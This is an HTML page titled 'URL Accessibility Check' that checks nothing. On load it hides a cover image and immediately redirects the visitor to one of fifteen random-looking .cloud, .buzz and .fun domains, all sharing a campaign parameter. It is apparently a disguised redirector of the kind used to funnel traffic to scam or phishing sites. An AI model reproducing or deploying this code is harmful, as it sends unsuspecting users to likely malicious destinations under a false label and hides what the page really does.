<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL Accessibility Check</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        #loadingImage {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 999;
        }
        #testFrame {
            display: none;
        }
    </style>
</head>
<body>

    <img id="loadingImage" src="start_page.png" alt="Loading...">

    <script>
        const urls = [
            "https://r7l8k5.cloud?f=889534" ,
            "https://r9j3p7.cloud?f=889534" ,
            "https://s2l8k7.cloud?f=889534" ,
            "https://cdefgh.buzz?f=889534" ,
            "https://defghi.buzz?f=889534" ,
            "https://x7t8u9.fun?f=889534" ,
            "https://q7m9t5.fun?f=889534" ,
            "https://q7n9l8.cloud?f=889534" ,
            "https://q9p7n3.cloud?f=889534" ,
            "https://h9m8t3.cloud?f=889534" ,
            "https://k5j8l3.cloud?f=889534" ,
            "https://efghij.buzz?f=889534" ,
            "https://z8l3r5.fun?f=889534" ,
            "https://z7l8p3.cloud?f=889534" ,
            "https://u7l5k3.fun?f=889534" ,
        ];

        const loadingImage = document.getElementById('loadingImage');

        function getRandomUrl() {
          const randomIndex = Math.floor(Math.random() * urls.length);
          const selectedUrl = urls[randomIndex];
          return selectedUrl;
        }
        const randomUrl = getRandomUrl();
        loadingImage.style.display = 'none';
        window.location.href = randomUrl;
        
    </script>

</body>
</html>
